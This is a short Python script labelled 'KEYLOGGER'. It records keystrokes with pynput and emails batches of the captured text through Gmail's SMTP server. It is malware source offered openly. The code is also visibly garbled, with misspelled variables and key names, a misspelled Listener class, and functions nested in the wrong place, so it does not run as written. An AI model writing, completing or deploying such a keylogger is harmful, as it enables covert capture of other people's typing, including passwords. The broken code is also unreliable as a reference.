import getpass
import smtplib

from pynput.keyboard import Key, Listener

print("KEYLOGGER")

# set up email
email = input('Enter email: ')
password = getpass.getpass(prompt='Password: ', stream=None)
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(email, password)


# logger
full_log = ''
word - ''
email_char_limit = 50

def on_press(key):
    global word
    global full_log
    global email
    global email_char_lmit

    if key == Key.space or key == Key.enter:
        word += ' '
        full_log += word
        word = ''
        if len(full_log) >= email_char_limit:
            send_log()
            full_log = ''
    elif key == Key.shift_1 or key == Key.sift_r:
        return
    elif key == Key.backsapce:
        word = word[:-1]
    else:
        char = f'{key}'
        char = char[1:-1]
        word += char

    if key == Key.esc:
        return False

    def send_log():
        server.sendmail(
            email,
            email,
            full_log
        )

    with istener( on_press=on_press ) as listener:
        listener.join()
